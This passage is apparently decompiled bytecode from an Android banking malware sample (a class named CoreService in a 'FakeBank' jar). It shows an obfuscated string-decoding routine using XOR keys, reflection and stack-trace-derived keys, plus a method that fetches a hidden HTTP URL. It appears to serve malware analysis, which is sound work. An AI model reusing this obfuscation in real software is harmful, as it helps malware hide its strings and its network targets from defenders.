      //   73: bastore
      //   74: dup
      //   75: bipush #12
      //   77: ldc -72
      //   79: bastore
      //   80: dup
      //   81: bipush #13
      //   83: ldc -44
      //   85: bastore
      //   86: dup
      //   87: bipush #14
      //   89: ldc -9
      //   91: bastore
      //   92: dup
      //   93: bipush #15
      //   95: ldc -27
      //   97: bastore
      //   98: dup
      //   99: bipush #16
      //   101: ldc -13
      //   103: bastore
      //   104: dup
      //   105: bipush #17
      //   107: ldc -96
      //   109: bastore
      //   110: dup
      //   111: bipush #18
      //   113: ldc -94
      //   115: bastore
      //   116: pop
      //   117: aload_0
      //   118: iconst_0
      //   119: iconst_2
      //   120: invokevirtual substring : (II)Ljava/lang/String;
      //   123: astore_3
      //   124: new java/lang/StringBuilder
      //   127: dup
      //   128: aload_0
      //   129: aload_0
      //   130: invokevirtual length : ()I
      //   133: iconst_2
      //   134: isub
      //   135: invokevirtual substring : (I)Ljava/lang/String;
      //   138: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   141: invokespecial <init> : (Ljava/lang/String;)V
      //   144: aload_0
      //   145: iconst_2
      //   146: aload_0
      //   147: invokevirtual length : ()I
      //   150: iconst_2
      //   151: isub
      //   152: invokevirtual substring : (II)Ljava/lang/String;
      //   155: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   158: aload_3
      //   159: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   162: invokevirtual toString : ()Ljava/lang/String;
      //   165: astore_0
      //   166: iconst_0
      //   167: istore #4
      //   169: iload #4
      //   171: bipush #19
      //   173: if_icmplt -> 583
      //   176: new java/lang/String
      //   179: dup
      //   180: aload_2
      //   181: invokespecial <init> : ([B)V
      //   184: astore_3
      //   185: new java/lang/StringBuilder
      //   188: dup
      //   189: aload_3
      //   190: iconst_2
      //   191: iconst_3
      //   192: invokevirtual substring : (II)Ljava/lang/String;
      //   195: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   198: invokespecial <init> : (Ljava/lang/String;)V
      //   201: aload_3
      //   202: bipush #16
      //   204: bipush #17
      //   206: invokevirtual substring : (II)Ljava/lang/String;
      //   209: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   212: invokevirtual toString : ()Ljava/lang/String;
      //   215: astore_2
      //   216: new java/lang/StringBuilder
      //   219: dup
      //   220: new java/lang/StringBuilder
      //   223: dup
      //   224: new java/lang/StringBuilder
      //   227: dup
      //   228: aload_2
      //   229: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   232: invokespecial <init> : (Ljava/lang/String;)V
      //   235: ldc 'c'
      //   237: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   240: invokevirtual toString : ()Ljava/lang/String;
      //   243: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   246: invokespecial <init> : (Ljava/lang/String;)V
      //   249: aload_3
      //   250: iconst_4
      //   251: iconst_5
      //   252: invokevirtual substring : (II)Ljava/lang/String;
      //   255: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   258: invokevirtual toString : ()Ljava/lang/String;
      //   261: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   264: invokespecial <init> : (Ljava/lang/String;)V
      //   267: aload_2
      //   268: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   271: invokevirtual toString : ()Ljava/lang/String;
      //   274: astore_2
      //   275: aload_3
      //   276: invokestatic forName : (Ljava/lang/String;)Ljava/lang/Class;
      //   279: astore_3
      //   280: aload_3
      //   281: aload_2
      //   282: iconst_2
      //   283: anewarray java/lang/Class
      //   286: dup
      //   287: iconst_0
      //   288: ldc java/lang/String
      //   290: aastore
      //   291: dup
      //   292: iconst_1
      //   293: getstatic java/lang/Integer.TYPE : Ljava/lang/Class;
      //   296: aastore
      //   297: invokevirtual getDeclaredMethod : (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
      //   300: aload_3
      //   301: iconst_2
      //   302: anewarray java/lang/Object
      //   305: dup
      //   306: iconst_0
      //   307: aload_0
      //   308: aastore
      //   309: dup
      //   310: iconst_1
      //   311: iconst_0
      //   312: invokestatic valueOf : (I)Ljava/lang/Integer;
      //   315: aastore
      //   316: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
      //   319: checkcast [B
      //   322: astore_0
      //   323: aload_0
      //   324: arraylength
      //   325: istore #5
      //   327: iload #5
      //   329: iconst_1
      //   330: isub
      //   331: aload_0
      //   332: iload #5
      //   334: iconst_1
      //   335: isub
      //   336: baload
      //   337: i2c
      //   338: invokestatic valueOf : (C)Ljava/lang/String;
      //   341: invokestatic parseInt : (Ljava/lang/String;)I
      //   344: isub
      //   345: istore #6
      //   347: aload_0
      //   348: iload #6
      //   350: iconst_1
      //   351: isub
      //   352: baload
      //   353: iconst_1
      //   354: if_icmpne -> 652
      //   357: iconst_1
      //   358: istore #4
      //   360: iinc #6, -1
      //   363: aload_0
      //   364: iload #6
      //   366: iconst_2
      //   367: isub
      //   368: baload
      //   369: i2c
      //   370: istore #7
      //   372: aload_0
      //   373: iload #6
      //   375: iconst_1
      //   376: isub
      //   377: baload
      //   378: i2c
      //   379: istore #8
      //   381: new java/lang/StringBuilder
      //   384: dup
      //   385: iload #7
      //   387: invokestatic valueOf : (C)Ljava/lang/String;
      //   390: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   393: invokespecial <init> : (Ljava/lang/String;)V
      //   396: iload #8
      //   398: invokestatic valueOf : (C)Ljava/lang/String;
      //   401: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   404: invokevirtual toString : ()Ljava/lang/String;
      //   407: bipush #16
      //   409: invokestatic parseInt : (Ljava/lang/String;I)I
      //   412: i2b
      //   413: bipush #98
      //   415: isub
      //   416: i2b
      //   417: istore #9
      //   419: iload #6
      //   421: iconst_2
      //   422: isub
      //   423: istore #10
      //   425: iconst_0
      //   426: istore #6
      //   428: iload #6
      //   430: iload #10
      //   432: if_icmplt -> 658
      //   435: iload #10
      //   437: istore #6
      //   439: iload #6
      //   441: iload #5
      //   443: if_icmplt -> 677
      //   446: iload #4
      //   448: iconst_1
      //   449: if_icmpne -> 559
      //   452: new java/lang/Exception
      //   455: dup
      //   456: invokespecial <init> : ()V
      //   459: invokevirtual getStackTrace : ()[Ljava/lang/StackTraceElement;
      //   462: iconst_1
      //   463: aaload
      //   464: astore_3
      //   465: aload_3
      //   466: invokevirtual getClassName : ()Ljava/lang/String;
      //   469: astore_2
      //   470: aload_2
      //   471: ldc '.'
      //   473: invokevirtual lastIndexOf : (Ljava/lang/String;)I
      //   476: istore #4
      //   478: aload_2
      //   479: astore_1
      //   480: iload #4
      //   482: iconst_m1
      //   483: if_icmpeq -> 495
      //   486: aload_2
      //   487: iload #4
      //   489: iconst_1
      //   490: iadd
      //   491: invokevirtual substring : (I)Ljava/lang/String;
      //   494: astore_1
      //   495: aload_3
      //   496: invokevirtual getMethodName : ()Ljava/lang/String;
      //   499: astore_2
      //   500: new java/lang/StringBuilder
      //   503: dup
      //   504: aload_1
      //   505: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   508: invokespecial <init> : (Ljava/lang/String;)V
      //   511: aload_2
      //   512: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   515: invokevirtual toString : ()Ljava/lang/String;
      //   518: astore_2
      //   519: aload_2
      //   520: astore_1
      //   521: aload_2
      //   522: invokevirtual length : ()I
      //   525: sipush #256
      //   528: if_icmple -> 540
      //   531: aload_2
      //   532: iconst_0
      //   533: sipush #256
      //   536: invokevirtual substring : (II)Ljava/lang/String;
      //   539: astore_1
      //   540: aload_1
      //   541: invokevirtual length : ()I
      //   544: istore #4
      //   546: iconst_0
      //   547: istore #6
      //   549: iinc #4, -1
      //   552: iload #6
      //   554: iload #10
      //   556: if_icmplt -> 689
      //   559: iload #10
      //   561: newarray byte
      //   563: astore_1
      //   564: iconst_0
      //   565: istore #4
      //   567: iload #4
      //   569: iload #10
      //   571: if_icmplt -> 740
      //   574: new java/lang/String
      //   577: dup
      //   578: aload_1
      //   579: invokespecial <init> : ([B)V
      //   582: areturn
      //   583: aload_2
      //   584: iload #4
      //   586: aload_2
      //   587: iload #4
      //   589: baload
      //   590: bipush #-106
      //   592: ixor
      //   593: i2b
      //   594: i2b
      //   595: bastore
      //   596: iinc #4, 1
      //   599: goto -> 169
      //   602: astore_0
      //   603: aload_0
      //   604: invokevirtual printStackTrace : ()V
      //   607: aload_1
      //   608: astore_0
      //   609: goto -> 323
      //   612: astore_0
      //   613: aload_0
      //   614: invokevirtual printStackTrace : ()V
      //   617: aload_1
      //   618: astore_0
      //   619: goto -> 323
      //   622: astore_0
      //   623: aload_0
      //   624: invokevirtual printStackTrace : ()V
      //   627: aload_1
      //   628: astore_0
      //   629: goto -> 323
      //   632: astore_0
      //   633: aload_0
      //   634: invokevirtual printStackTrace : ()V
      //   637: aload_1
      //   638: astore_0
      //   639: goto -> 323
      //   642: astore_0
      //   643: aload_0
      //   644: invokevirtual printStackTrace : ()V
      //   647: aload_1
      //   648: astore_0
      //   649: goto -> 323
      //   652: iconst_0
      //   653: istore #4
      //   655: goto -> 360
      //   658: aload_0
      //   659: iload #6
      //   661: aload_0
      //   662: iload #6
      //   664: baload
      //   665: iload #9
      //   667: ixor
      //   668: i2b
      //   669: i2b
      //   670: bastore
      //   671: iinc #6, 1
      //   674: goto -> 428
      //   677: aload_0
      //   678: iload #6
      //   680: iconst_0
      //   681: i2b
      //   682: bastore
      //   683: iinc #6, 1
      //   686: goto -> 439
      //   689: aload_0
      //   690: iload #6
      //   692: baload
      //   693: istore #9
      //   695: iload #4
      //   697: iconst_1
      //   698: isub
      //   699: istore #5
      //   701: aload_0
      //   702: iload #6
      //   704: iload #9
      //   706: aload_1
      //   707: iload #4
      //   709: invokevirtual charAt : (I)C
      //   712: i2b
      //   713: ixor
      //   714: i2b
      //   715: i2b
      //   716: bastore
      //   717: iload #5
      //   719: istore #4
      //   721: iload #5
      //   723: ifge -> 734
      //   726: aload_1
      //   727: invokevirtual length : ()I
      //   730: iconst_1
      //   731: isub
      //   732: istore #4
      //   734: iinc #6, 1
      //   737: goto -> 552
      //   740: aload_1
      //   741: iload #4
      //   743: aload_0
      //   744: iload #4
      //   746: baload
      //   747: i2b
      //   748: bastore
      //   749: iinc #4, 1
      //   752: goto -> 567
      // Exception table:
      //   from	to	target	type
      //   275	323	602	java/lang/ClassNotFoundException
      //   275	323	612	java/lang/IllegalAccessException
      //   275	323	622	java/lang/NoSuchMethodException
      //   275	323	632	java/lang/IllegalArgumentException
      //   275	323	642	java/lang/reflect/InvocationTargetException
    }
    
    public void run() {
      String str = CoreService.this.conn.getHttpConnection(CoreService.this.httpUrl);
      System.out.println(run("==UJbxgTaz4CcgolRF46ags3vbeCqjUxAVi7tZtqNQaS") + str);
    }
  }
}


/* Location:              /home/fahim/Desktop/BreakFakeBank-dex2jar.jar!/com/google/bps/bfcfc/CoreService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */